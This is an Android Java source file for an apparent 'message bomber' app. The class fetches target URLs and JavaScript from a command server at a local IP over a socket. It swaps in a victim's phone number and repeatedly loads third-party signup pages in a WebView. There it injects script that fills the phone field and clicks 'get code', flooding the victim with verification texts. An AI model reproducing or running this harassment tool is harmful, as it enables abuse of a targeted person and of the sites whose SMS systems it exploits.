package com.example.service;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;

import org.json.JSONArray;

import com.example.data.Data;
import com.example.data.Data2;
import com.example.database.DataBaseHelper;
import com.example.messagebomber.R.string;

import android.content.Context;
import android.text.StaticLayout;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class Bomber extends Thread{

	Data data = new Data();
	Data2 data2 = new Data2();
	int i = 0;
	int j = 0;
	String phoneNumber;
	WebView webView;
	String string;
	int flag = 0;
	int flag2 = 0;
	
	
	public Bomber(String phoneNumber, WebView webView) {
		this.phoneNumber = phoneNumber;
		this.webView = webView;
		
	}

	public void run(){
		for(int j = 0;j<data.js.length;j++){
			Socket socket = null;
			try {
				socket = new Socket("192.168.1.102",9999);
				ObjectInputStream ois = new ObjectInputStream(new BufferedInputStream(socket.getInputStream()));
				data.url[i] = ((DataObject)ois.readObject()).getUrl();
				data.js[i] =  ((DataObject)ois.readObject()).getJs();
			} catch (UnknownHostException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (ClassNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			data.url[j] = replaceString(data.url[j], "13538805451", phoneNumber);
			data.js[j] = replaceString(data.js[j], "13538805451", phoneNumber);
			System.out.println(data.url[j]);
			System.out.println(data.js[j]);
		}
			
		while(i<data.js.length){
			bomb(webView, data.url[i]);
			try {
				sleep(5000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			i++;
			if(i == data.js.length-1){
				flag++;
				i = 0;
				if(flag >= 5){
					break;
				}
			}
		}
		//second part ,with check code
		while(j<data2.js.length){
			bomb(webView, data2.url[i]);
			try {
				sleep(10000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			i++;
			if(i == data2.js.length-1){
				flag2++;
				i = 0;
				if(flag2 >= 5){
					break;
				}
			}
		}
		
	}
	public void bomb(WebView webView,String url){
		
	//	String url = "http://www.souche.com/pages/minilogin.html";	
		webView.getSettings().setJavaScriptEnabled(true);
		webView.setWebViewClient(new WebViewClient(){
			public void onPageFinished(WebView webView,String url){	
				super.onPageFinished(webView, url);
	/*			webView.loadUrl("javascript:"+"var ele = document.getElementById(\"mem-tel\");" +
						"ele.value = "+phoneNumber+";var ele = document.getElementById(\"get-code\");" +
						"ele.click();");		
						*/
				webView.loadUrl(data.js[i]);
				System.out.println(i);
			}			
		});
			
		webView.loadUrl(url);
		
//		String url2 = "http://user.migu.cn/register/index.action";
//		webView.loadUrl(url2);
	}

	public static String replaceString(String src, String before, String after) {
		StringBuffer sb = new StringBuffer();
		int oldidx = 0;
		int idx = src.indexOf(before);
		while (idx != -1) {
			sb.append(src.substring(oldidx, idx)).append(after);
			oldidx = idx + before.length();
			idx = src.indexOf(before, oldidx);
		}
		if (oldidx < src.length())
			sb.append(src.substring(oldidx));
		return sb.toString();
	}
	
}
